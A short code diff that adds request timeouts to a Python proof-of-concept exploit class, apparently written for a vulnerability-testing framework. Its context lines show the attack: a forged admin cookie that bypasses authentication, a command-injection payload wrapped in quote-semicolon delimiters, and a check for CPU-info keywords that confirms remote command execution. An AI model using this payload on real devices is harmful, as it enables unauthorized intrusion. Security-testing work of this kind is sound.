@@ -47,8 +47,8 @@ class DemoPOC(POCBase):
         data = "';{};'".format(cmd)
         headers = {'cookie': 'isAdmin=1;username=admin'}
         try:
-            requests.get(veri_url1)
-            resp = requests.post(veri_url2, data=data, headers=headers)
+            requests.get(veri_url1,timeout=10)
+            resp = requests.post(veri_url2, data=data, headers=headers, timeout=15)
             if any(keyword in resp.text for keyword in ['Processor', 'BogoMIPS', 'Hardware', 'Revision']):
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
@@ -74,8 +74,8 @@ class DemoPOC(POCBase):
         data = "';{};'".format(cmd)
         headers = {'cookie': 'isAdmin=1;username=admin'}
         try:
-            requests.get(veri_url1)
-            requests.post(veri_url2, data=data, headers=headers)
+            requests.get(veri_url1,timeout=10)
+            requests.post(veri_url2, data=data, headers=headers, timeout=15)
         except Exception as e:
             logger.warn(str(e))
 
